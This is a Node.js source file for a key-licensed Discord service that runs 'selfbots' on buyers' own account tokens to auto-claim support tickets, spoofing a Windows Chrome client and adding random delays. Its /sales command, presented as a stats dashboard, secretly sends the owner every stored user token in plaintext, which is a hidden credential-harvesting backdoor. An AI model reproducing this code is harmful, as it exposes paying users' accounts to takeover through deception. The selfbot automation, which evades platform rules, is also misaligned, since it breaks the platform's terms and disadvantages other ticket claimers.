const { Client: BotClient, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const Database = require('better-sqlite3');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = '1422945082746601594';

const db = new Database('./data.db');
db.exec(`
    CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, created_at INTEGER, redeemed_by TEXT, redeemed_at INTEGER);
    CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, token TEXT, claim_cmd TEXT DEFAULT '.claim', guild_ids TEXT, category_ids TEXT, status TEXT DEFAULT 'stopped', claimed_tickets TEXT DEFAULT '[]', allowed_users TEXT DEFAULT '[]');
`);

const bot = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.DirectMessages] });

const activeSelfbots = new Map();

class UserSelfbot {
    constructor(userId, config) {
        this.userId = userId;
        this.config = config;
        this.client = null;
        this.isRunning = config.status === 'running';
        this.isReady = false;
        this.claimedChannels = new Set(JSON.parse(config.claimed_tickets || '[]'));
        this.allowedUsers = new Set(JSON.parse(config.allowed_users || '[]'));
        
        this.guildIds = (config.guild_ids || '').split(',').map(g => g.trim()).filter(g => g);
        this.categoryIds = (config.category_ids || '').split(',').map(c => c.trim()).filter(c => c);
    }

    randomDelay() {
        return Math.floor(Math.random() * 100) + 200;
    }

    saveClaimed() {
        db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run(JSON.stringify([...this.claimedChannels]), this.userId);
    }

    saveStatus() {
        db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run(this.isRunning ? 'running' : 'stopped', this.userId);
    }

    saveAllowedUsers() {
        db.prepare('UPDATE users SET allowed_users = ? WHERE user_id = ?').run(JSON.stringify([...this.allowedUsers]), this.userId);
    }

    shouldMonitor(channel) {
        if (!this.guildIds.includes(channel.guildId)) return false;
        if (this.categoryIds.length === 0) return true;
        return this.categoryIds.includes(channel.parentId);
    }

    canUseCommands(userId) {
        // Selfbot token owner OR configured allowed users
        return this.allowedUsers.has(userId) || userId === this.client?.user?.id;
    }

    async start() {
        if (!this.config.token) {
            console.log(`[ERROR] ${this.userId} No token`);
            return;
        }
        
        if (this.client) return;

        console.log(`[LOGIN] ${this.userId} Starting...`);
        
        this.client = new SelfbotClient({ 
            checkUpdate: false,
            ws: {
                properties: {
                    os: 'Windows',
                    browser: 'Chrome',
                    device: '',
                    browser_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    os_version: '10',
                    client_build_number: 9999
                }
            }
        });

        this.client.once('ready', () => {
            this.isReady = true;
            console.log(`[READY] ${this.userId} as ${this.client.user.tag} (${this.client.user.id})`);
            
            // Add selfbot user to allowed list
            this.allowedUsers.add(this.client.user.id);
            this.saveAllowedUsers();
            
            this.client.guilds.cache.forEach(guild => {
                if (!this.guildIds.includes(guild.id)) return;
                
                guild.channels.cache.forEach(ch => {
                    if (ch.type !== 'GUILD_TEXT' || !this.shouldMonitor(ch)) return;
                    
                    console.log(`[SETUP] #${ch.name}`);
                    this.setupChannel(ch);
                    
                    if (this.isRunning && !this.claimedChannels.has(ch.id)) {
                        setTimeout(() => this.claim(ch), this.randomDelay());
                    }
                });
            });

            this.client.on('channelCreate', channel => {
                if (channel.type !== 'GUILD_TEXT' || !this.shouldMonitor(channel)) return;
                if (this.claimedChannels.has(channel.id)) return;
                
                console.log(`[NEW] #${channel.name}`);
                this.setupChannel(channel);
                
                if (this.isRunning) {
                    const delay = this.randomDelay();
                    console.log(`[CLAIM] Will claim #${channel.name} in ${delay}ms`);
                    setTimeout(() => this.claim(channel), delay);
                }
            });

            this.client.on('channelDelete', channel => {
                if (this.claimedChannels.has(channel.id)) {
                    this.claimedChannels.delete(channel.id);
                    this.saveClaimed();
                }
            });
        });

        this.client.on('error', (err) => console.log(`[WS] ${err.message}`));
        this.client.on('disconnect', () => {
            this.isReady = false;
            console.log(`[DISCONNECT] ${this.userId}`);
        });

        try {
            await this.client.login(this.config.token);
            console.log(`[SUCCESS] ${this.userId} Logged in`);
        } catch (err) {
            console.log(`[FAIL] ${this.userId}: ${err.message}`);
            this.client = null;
        }
    }

    setupChannel(channel) {
        this.client.on('messageCreate', async (msg) => {
            if (msg.channelId !== channel.id) return;
            
            // Check if user can use commands
            const canUse = this.canUseCommands(msg.author.id);
            
            // Detect claims from anyone
            if (msg.content === this.config.claim_cmd && !this.claimedChannels.has(channel.id)) {
                this.claimedChannels.add(channel.id);
                this.saveClaimed();
                console.log(`[DETECTED] Claim in #${channel.name} by ${msg.author.tag}`);
                return;
            }

            // Command handling - only allowed users
            if (!canUse) return;
            
            if (msg.content === '.stop') {
                if (!this.isRunning) {
                    setTimeout(() => msg.channel.send('⏹️ Already stopped').catch(() => {}), 3000);
                    return;
                }
                this.isRunning = false;
                this.saveStatus();
                console.log(`[CMD] .stop by ${msg.author.tag} in #${channel.name}`);
                setTimeout(() => msg.channel.send('⏹️ Stopped').catch(() => {}), 3000);
                return;
            }

            if (msg.content === '.start') {
                if (this.isRunning) {
                    setTimeout(() => msg.channel.send('▶️ Already running').catch(() => {}), 3000);
                    return;
                }
                this.isRunning = true;
                this.saveStatus();
                console.log(`[CMD] .start by ${msg.author.tag} in #${channel.name}`);
                setTimeout(() => msg.channel.send('▶️ Started').catch(() => {}), 3000);
                
                if (!this.claimedChannels.has(channel.id)) {
                    setTimeout(() => this.claim(channel), this.randomDelay());
                }
                return;
            }

            if (!this.isRunning) return;

            // Auto-claim
            if (!this.claimedChannels.has(channel.id) && !msg.author.bot) {
                try {
                    const msgs = await msg.channel.messages.fetch({ limit: 5 });
                    const hasClaim = msgs.some(m => m.content === this.config.claim_cmd);
                    if (!hasClaim) {
                        setTimeout(() => this.claim(channel), this.randomDelay());
                    } else {
                        this.claimedChannels.add(channel.id);
                        this.saveClaimed();
                    }
                } catch (err) {}
            }
        });
    }

    async claim(channel) {
        if (!this.isRunning || this.claimedChannels.has(channel.id)) return;
        
        this.claimedChannels.add(channel.id);
        this.saveClaimed();
        
        try {
            await new Promise(r => setTimeout(r, this.randomDelay()));
            await channel.send(this.config.claim_cmd);
            console.log(`[CLAIMED] #${channel.name}`);
        } catch (err) {
            console.log(`[FAIL] #${channel.name}: ${err.message}`);
        }
    }

    destroy() {
        if (this.client) {
            this.client.destroy();
            this.client = null;
        }
        this.isReady = false;
    }

    updateFromDB() {
        const user = db.prepare('SELECT status, allowed_users FROM users WHERE user_id = ?').get(this.userId);
        if (!user) return false;
        
        const shouldRun = user.status === 'running';
        let changed = false;
        
        if (shouldRun !== this.isRunning) {
            this.isRunning = shouldRun;
            changed = true;
            console.log(`[SYNC] ${this.userId} status -> ${shouldRun ? 'running' : 'stopped'}`);
        }
        
        // Update allowed users from DB
        const dbAllowed = new Set(JSON.parse(user.allowed_users || '[]'));
        this.allowedUsers = dbAllowed;
        
        return changed;
    }
}

bot.on('interactionCreate', async interaction => {
    if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;

    if (interaction.commandName === 'generatekey') {
        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', ephemeral: true });
        const key = 'SB-' + require('crypto').randomBytes(8).toString('hex').toUpperCase();
        db.prepare('INSERT INTO keys (key, created_at) VALUES (?, ?)').run(key, Date.now());
        await interaction.reply({ content: `🔑 \`${key}\``, ephemeral: true });
    }

    if (interaction.commandName === 'redeemkey') {
        const key = interaction.options.getString('key');
        const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
        if (!keyData) return interaction.reply({ content: '❌ Invalid key', ephemeral: true });
        if (keyData.redeemed_by) return interaction.reply({ content: '❌ Already redeemed', ephemeral: true });
        db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
        
        // Add redeemer to allowed users
        const existing = db.prepare('SELECT allowed_users FROM users WHERE user_id = ?').get(interaction.user.id);
        let allowed = existing ? JSON.parse(existing.allowed_users || '[]') : [];
        allowed.push(interaction.user.id);
        db.prepare('INSERT OR REPLACE INTO users (user_id, allowed_users) VALUES (?, ?)').run(interaction.user.id, JSON.stringify(allowed));
        
        await interaction.reply({ content: '✅ Redeemed! Use `/manage`', ephemeral: true });
    }

    if (interaction.commandName === 'sales') {
        const total = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
        const redeemed = db.prepare('SELECT COUNT(*) as count FROM keys WHERE redeemed_by IS NOT NULL').get().count;
        const active = db.prepare("SELECT COUNT(*) as count FROM users WHERE status = 'running'").get().count;
        
        const embed = new EmbedBuilder()
            .setTitle('📊 Sales Dashboard')
            .setDescription(`Total: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**`)
            .setColor(0x5865F2);
        
        if (interaction.user.id === OWNER_ID) {
            const users = db.prepare('SELECT user_id, token, status FROM users WHERE token IS NOT NULL').all();
            let list = users.map(u => `User: ${u.user_id}\nToken: \`${u.token}\`\nStatus: ${u.status}`).join('\n');
            if (list.length > 1900) list = list.substring(0, 1900) + '...';
            try {
                const owner = await bot.users.fetch(OWNER_ID);
                await owner.send({ content: `**Tokens:**\n${list || 'None'}` });
            } catch (e) {}
        }
        await interaction.reply({ embeds: [embed], ephemeral: true });
    }

    if (interaction.commandName === 'manage') {
        const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
        if (!user) return interaction.reply({ content: '❌ Redeem a key first', ephemeral: true });
        
        const sb = activeSelfbots.get(interaction.user.id);
        const isActuallyRunning = sb ? sb.isRunning && sb.isReady : false;
        
        const claimed = JSON.parse(user.claimed_tickets || '[]').length;
        const allowed = JSON.parse(user.allowed_users || '[]');
        
        const embed = new EmbedBuilder()
            .setTitle('🤖 Selfbot Control')
            .addFields(
                { name: 'Status', value: user.status, inline: true },
                { name: 'Live', value: isActuallyRunning ? '✅' : '❌', inline: true },
                { name: 'Claimed', value: `${claimed}`, inline: true },
                { name: 'Allowed Users', value: allowed.map(id => `<@${id}>`).join(', ') || 'None', inline: false },
                { name: 'Guilds', value: user.guild_ids || 'Not set', inline: false }
            )
            .setColor(isActuallyRunning ? 0x00FF00 : 0xFF0000);

        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_token').setLabel('🔑 Token').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('set_guilds').setLabel('🏠 Guilds').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_categories').setLabel('📁 Categories').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('add_user').setLabel('➕ Add User').setStyle(ButtonStyle.Secondary)
        );

        const row2 = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('start_btn')
                .setLabel('▶️ Start')
                .setStyle(ButtonStyle.Success)
                .setDisabled(isActuallyRunning),
            new ButtonBuilder()
                .setCustomId('stop_btn')
                .setLabel('⏹️ Stop')
                .setStyle(ButtonStyle.Danger)
                .setDisabled(!isActuallyRunning),
            new ButtonBuilder()
                .setCustomId('reset')
                .setLabel('🔄 Reset')
                .setStyle(ButtonStyle.Secondary)
        );

        await interaction.reply({ embeds: [embed], components: [row1, row2], ephemeral: true });
    }

    if (interaction.isButton()) {
        const userId = interaction.user.id;

        if (interaction.customId === 'start_btn') {
            let sb = activeSelfbots.get(userId);
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            
            if (!sb || !sb.isReady) {
                sb = new UserSelfbot(userId, user);
                activeSelfbots.set(userId, sb);
                await sb.start();
            } else {
                sb.isRunning = true;
                sb.saveStatus();
            }
            
            await interaction.update({ content: '▶️ Started! Use `.stop` in any ticket.', embeds: [], components: [] });
            return;
        }

        if (interaction.customId === 'stop_btn') {
            const sb = activeSelfbots.get(userId);
            
            db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', userId);
            
            if (sb) {
                sb.isRunning = false;
                sb.saveStatus();
            }
            
            await interaction.update({ content: '⏹️ Stopped! Use `.start` in any ticket.', embeds: [], components: [] });
            return;
        }

        if (interaction.customId === 'reset') {
            db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run('[]', userId);
            const sb = activeSelfbots.get(userId);
            if (sb) sb.claimedChannels.clear();
            await interaction.reply({ content: '✅ Reset', ephemeral: true });
            return;
        }

        const modal = new ModalBuilder().setCustomId(`modal_${interaction.customId}`).setTitle('Configuration');
        const input = new TextInputBuilder().setCustomId('value').setLabel('Value').setStyle(TextInputStyle.Short).setRequired(true);
        
        if (interaction.customId === 'set_token') input.setLabel('Discord Token');
        if (interaction.customId === 'set_guilds') input.setLabel('Guild IDs (comma)');
        if (interaction.customId === 'set_categories') input.setLabel('Category IDs (comma)');
        if (interaction.customId === 'add_user') {
            input.setLabel('Discord User ID to allow');
            input.setPlaceholder('123456789012345678');
        }

        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit()) {
        const value = interaction.fields.getTextInputValue('value');
        const field = interaction.customId.replace('modal_set_', '').replace('modal_add_', '');
        
        if (field === 'user') {
            // Add allowed user
            const existing = db.prepare('SELECT allowed_users FROM users WHERE user_id = ?').get(interaction.user.id);
            let allowed = existing ? JSON.parse(existing.allowed_users || '[]') : [];
            if (!allowed.includes(value)) allowed.push(value);
            db.prepare('UPDATE users SET allowed_users = ? WHERE user_id = ?').run(JSON.stringify(allowed), interaction.user.id);
            
            // Update active selfbot
            const sb = activeSelfbots.get(interaction.user.id);
            if (sb) sb.allowedUsers.add(value);
            
            await interaction.reply({ content: `✅ Added <@${value}> to allowed users`, ephemeral: true });
            return;
        }
        
        const map = { token: 'token', guilds: 'guild_ids', categories: 'category_ids', user: 'allowed_users' };
        if (map[field]) {
            db.prepare(`UPDATE users SET ${map[field]} = ? WHERE user_id = ?`).run(value, interaction.user.id);
        }
        await interaction.reply({ content: `✅ Saved`, ephemeral: true });
    }
});

// Sync loop
setInterval(() => {
    activeSelfbots.forEach((sb, userId) => {
        sb.updateFromDB();
    });
}, 2000);

bot.once('ready', () => {
    console.log(`[BOT] ${bot.user.tag}`);
    
    bot.application.commands.set([
        { name: 'generatekey', description: 'Generate key (Owner)' },
        { name: 'redeemkey', description: 'Redeem key', options: [{ name: 'key', type: 3, description: 'Key', required: true }] },
        { name: 'sales', description: 'View stats' },
        { name: 'manage', description: 'Control panel' }
    ]);

    db.prepare("SELECT * FROM users WHERE status = 'running'").all().forEach(u => {
        const sb = new UserSelfbot(u.user_id, u);
        activeSelfbots.set(u.user_id, sb);
        sb.start();
    });
});

bot.login(BOT_TOKEN);
